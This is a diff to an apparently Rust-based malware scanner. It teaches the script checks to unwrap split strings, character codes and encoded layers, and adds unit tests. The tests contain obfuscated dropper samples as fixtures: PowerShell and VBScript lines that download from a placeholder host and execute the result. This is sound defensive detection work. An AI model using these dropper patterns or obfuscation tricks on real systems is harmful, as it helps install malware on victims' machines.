@@ -167,14 +167,19 @@ pub fn checks(path: &Path, data: &[u8]) -> Vec<Detection> {
         }
     }
 
-    if matches!(e.as_str(), "js" | "jse" | "vbs" | "vbe" | "wsf" | "wsh" | "hta") && !WSH.iter().any(|k| lower.contains(k)) {
+    // Split strings ("WScr" & "ipt.Shell") must not slip past the gate.
+    let joined = crate::deobf::normalize(&original).to_ascii_lowercase();
+    if matches!(e.as_str(), "js" | "jse" | "vbs" | "vbe" | "wsf" | "wsh" | "hta") && !WSH.iter().any(|k| lower.contains(k) || joined.contains(k)) {
         return out;
     }
 
-    // Scripts: download plus run, possibly hidden in a base64 PowerShell payload.
-    let mut texts = vec![lower.clone()];
-    texts.extend(decode_encoded_commands(&lower, &original).into_iter().map(|t| t.to_ascii_lowercase()));
-    for (i, t) in texts.iter().enumerate() {
+    // Scripts: download plus run, possibly hidden in an encoded PowerShell payload, split
+    // strings, character codes, reversed text or (compressed) base64 layers.
+    let mut texts: Vec<(String, Option<&str>)> = vec![(lower.clone(), None)];
+    texts.extend(decode_encoded_commands(&lower, &original).into_iter().map(|t| (t.to_ascii_lowercase(), Some("an encoded PowerShell command"))));
+    let encoded = texts.len() > 1;
+    texts.extend(crate::deobf::layers(&original).into_iter().map(|(t, why)| (t.to_ascii_lowercase(), Some(why))));
+    for (t, hidden) in &texts {
         let w = words(t);
         let mut fetch = any(t, FETCH);
         fetch.extend(WORD_TOKENS[..4].iter().copied().filter(|k| w.contains(k)).map(str::trim));
@@ -188,13 +193,12 @@ pub fn checks(path: &Path, data: &[u8]) -> Vec<Detection> {
                     "This script downloads something ({}) and runs it ({}){}. That's how most malware gets installed.",
                     fetch[0].trim(),
                     run[0].trim_matches(|c: char| matches!(c, '"' | '\x27' | ';' | ')' | ' ')),
-                    if i > 0 { ", hidden inside an encoded PowerShell command" } else { "" }
+                    hidden.map(|h| format!(", hidden with {h}")).unwrap_or_default()
                 ),
             ));
             return out;
         }
     }
-    let encoded = texts.len() > 1;
     let char_codes = lower.matches("fromcharcode").count() + lower.matches("chr(").count() + lower.matches("chrw(").count();
     let longest_line = original.lines().map(str::len).max().unwrap_or(0);
     if encoded && lower.contains("hidden") {
@@ -244,6 +248,22 @@ mod tests {
         let d = checks(Path::new("run.bat"), wrapper.as_bytes());
         assert_eq!(d[0].name, "Suspicious/Script.DownloadExec!a");
         assert!(d[0].description.contains("encoded PowerShell"));
+    }
+
+    #[test]
+    fn obfuscated_droppers_are_unwrapped() {
+        // Split strings.
+        let split = j(&["$w = New-Object Net.Web", "Client; I`E`X $w.('Down'+'load'+'Str", "ing')('http://x.invalid/a')"]);
+        let d = checks(Path::new("a.ps1"), split.as_bytes());
+        assert_eq!(d[0].name, "Suspicious/Script.DownloadExec!a", "{d:?}");
+        // VBScript: the WSH gate must see through "WScr" & "ipt.Shell".
+        let vbs = j(&["Set h = CreateObject(\"MSXML2.XML", "HTTP\")\nh.Open \"GET\", \"http://x.invalid/a\"\nSet s = CreateObject(\"WScr\" & \"ipt.Sh", "ell\")\ns.Ru", "n \"a.exe\""]);
+        assert_eq!(names("a.vbs", &vbs), ["Suspicious/Script.DownloadExec!a"]);
+        // Character codes.
+        let payload = j(&["IE", "X (New-Object Net.WebClient).Downl", "oadString('http://x.invalid/b')"]);
+        let codes: Vec<String> = payload.bytes().map(|b| format!("[char]{b}")).collect();
+        let d = checks(Path::new("c.ps1"), format!("$c = {}\n& ([scriptblock]::Create($c))", codes.join("+")).as_bytes());
+        assert!(d.iter().any(|x| x.name == "Suspicious/Script.DownloadExec!a" && x.description.contains("character codes")), "{d:?}");
     }
 
     #[test]
